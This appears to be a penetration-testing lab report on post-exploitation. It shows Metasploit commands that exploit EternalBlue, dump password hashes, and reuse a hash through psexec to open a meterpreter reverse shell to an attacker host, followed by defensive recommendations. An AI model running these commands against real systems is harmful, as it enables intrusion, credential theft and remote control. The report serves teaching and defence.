# POST EXPLOITATION

## Executive Summary

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The report post-exploitation techniques and tools used in penetration testing. The goal of post-exploitation is to maintain access to a target system after it has been compromised. Metasploit is a popular framework for post-exploitation, with modules for privilege escalation, data exfiltration, and lateral movement. Meterpreter is a Metasploit module that enables remote control of a target system, with features for file transfer, process management, and network reconnaissance. Other post-exploitation tools include PowerSploit, Mimikatz, and Empire, which can be used for credential theft, privilege escalation, and lateral movement. Post-exploitation techniques include manipulating file permissions, creating backdoors, and installing rootkits to maintain persistent access. Network reconnaissance is also crucial in post-exploitation, with tools like Nmap and Netcat used to identify other systems on the network and gather information about vulnerabilities. It is important to use post-exploitation tools and techniques with caution in a production environment to avoid unintended damage to systems and networks.

## Metasploitable 2

```ruby
msfconsole
use exploit/windows/smb/eternalblue_doublepulsar.rb
show options
set RHOST 192.168.1.22
set RPORT 445
run
```

- Metasploit techniques can be used to gain unauthorized access to a business's systems and data.
- Attackers can use stolen data for financial gain, such as selling it on the black market or using it to commit fraud.
- A successful Metasploit attack can result in reputational damage to a business, which can lead to a loss of customers and revenue.
- Metasploit attacks can disrupt business operations, leading to lost revenue and damage to the company's reputation.
- A successful Metasploit attack can result in legal liabilities, including fines and lawsuits.
- Incident response and remediation efforts can be costly for businesses following a Metasploit attack.
- Businesses can reduce the risk of Metasploit attacks by implementing strong security controls, such as firewalls and intrusion detection systems, and regularly testing their systems for vulnerabilities.
- It is also important for businesses to train their staff to recognize and respond to potential security threats, such as phishing attacks or suspicious activity on the network.

## Windows 7

```ruby
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
run

hashdump

search psexec
use exploit/windows/smb/psexec
set RHOST 192.168.1.23
set smbuser admin2
set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.24
set LPORT 1234
run
```

- This exploit takes advantage of a vulnerability in the Windows SMB (Server Message Block) protocol, which allows an attacker to execute arbitrary code on the target machine.
- Once the attacker gains access to the target machine using EternalBlue, they are using the "hashdump" command to dump the credentials of the users on the machine. This allows the attacker to obtain the username and password hashes for the users on the machine, which they can use to escalate their privileges and gain further access to the network.
- Next, using the "search" command to look for the "psexec" module, which is a metasploit module that can be used to execute commands on a remote Windows machine using the SMB protocol. The attacker then sets the required parameters for the psexec module, such as the target machine's IP address, the credentials they obtained using "hashdump", and the payload they want to use for the attack.
- Using is **`windows/x64/meterpreter/reverse_tcp`**, which is a type of malware that provides the attacker with a remote shell on the target machine. This allows the attacker to execute commands on the target machine, steal data, and carry out further attacks on the network.
- **`run`** command. This launches the attack and allows the attacker to gain access to the target machine, escalate their privileges, and carry out further attacks on the network.

### Tactical Recommendations:

- Keep all Windows systems fully patched and up-to-date to prevent vulnerabilities that can be exploited by EternalBlue.
- Monitor network traffic and detect any attempts to exploit the vulnerabilities targeted by EternalBlue.
- Use antivirus software and keep virus definitions updated to help detect and prevent the EternalBlue exploit.
- Implement proper access controls and restrict the use of administrative privileges on systems to minimize the impact of successful attacks.
- Block external access to the SMB service (TCP port 445) at the network perimeter, if possible.
- Use network segmentation to isolate critical systems from less critical ones, limiting the potential for lateral movement by attackers.

### Strategic Recommendations:

- Establish a comprehensive security program that includes regular vulnerability assessments, penetration testing, and patch management.
- Develop an incident response plan that outlines the steps to be taken in the event of a successful Metasploit attack, including containment, investigation, and remediation.
- Provide security training to staff to help them identify and respond to potential security threats, such as phishing emails and suspicious activity on the network.
- Consider using threat intelligence to stay up-to-date on the latest tactics and techniques used by attackers, and use this information to update security controls and improve incident response procedures.
- Ensure that security controls and procedures are regularly reviewed and updated to stay current with emerging threats and evolving security risks.
